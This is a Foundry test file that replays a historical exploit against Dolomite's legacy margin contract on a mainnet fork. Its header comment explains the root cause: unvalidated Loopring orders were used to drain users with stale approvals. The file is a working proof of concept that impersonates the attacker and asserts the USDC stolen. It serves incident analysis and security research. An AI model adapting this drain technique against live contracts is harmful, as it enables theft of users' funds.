// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$1.8M
    - Attacker: https://etherscan.io/address/0x52522d35725836d48e12e64731fa170bcd9423bf
    - Attack Contract: https://etherscan.io/address/0x0da9fcc650e2109e09344fd571bb78091b781f06
    - Vulnerable Contract: https://etherscan.io/address/0x7f49ac8fdb38d24b686130e22579c7efe69b19c0
    - Representative Attack Tx: https://etherscan.io/tx/0x4e5b294488736d467abcb8d8ef8536a1dcaf8848cb64fdf9f39c3b04c06271b2
    - Analysis: https://medium.com/dolomite-official/legacy-smart-contract-vulnerability-post-mortem-analysis-931d7b555269

    Invalid Loopring orders were marked as partially filled with uint256.max.
    The partially-filled path skipped signature validation, while Dolomite still
    converted the unvalidated orders into SoloMargin deposits from victims with
    stale approvals. This replays the first drain transaction and withdrawal.
*/

interface IERC20Dolomite {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract DolomiteExploitTest is Test {
    uint256 private constant FORK_BLOCK = 19_477_008;

    address private constant ATTACKER = 0x52522D35725836D48E12e64731FA170BCd9423bf;
    address private constant ATTACK_CONTRACT = 0x0Da9FcC650e2109e09344fd571Bb78091b781F06;
    address private constant DOLOMITE_MARGIN = 0x7f49ac8fDb38D24B686130E22579C7Efe69b19c0;
    IERC20Dolomite private constant USDC = IERC20Dolomite(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "AttackContract");
        vm.label(DOLOMITE_MARGIN, "LegacyDolomiteMargin");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        bytes memory exploitCalldata = vm.parseBytes(vm.readLine("src/test/2024-03/dolomite_calldata.txt"));
        uint256 attackerUsdcBefore = USDC.balanceOf(ATTACKER);

        vm.prank(ATTACKER, ATTACKER);
        (bool success, bytes memory returnData) = DOLOMITE_MARGIN.call(exploitCalldata);
        if (!success) {
            emit log_named_bytes("Dolomite revert data", returnData);
        }
        assertTrue(success, "Dolomite exploit call failed");

        vm.prank(ATTACKER, ATTACKER);
        (success,) = ATTACK_CONTRACT.call(abi.encodeWithSignature("withdrawall()"));
        assertTrue(success, "profit withdrawal failed");

        uint256 usdcProfit = USDC.balanceOf(ATTACKER) - attackerUsdcBefore;
        emit log_named_decimal_uint("USDC drained in representative call", usdcProfit, 6);
        assertEq(usdcProfit, 1_158_297.126131e6);
    }
}
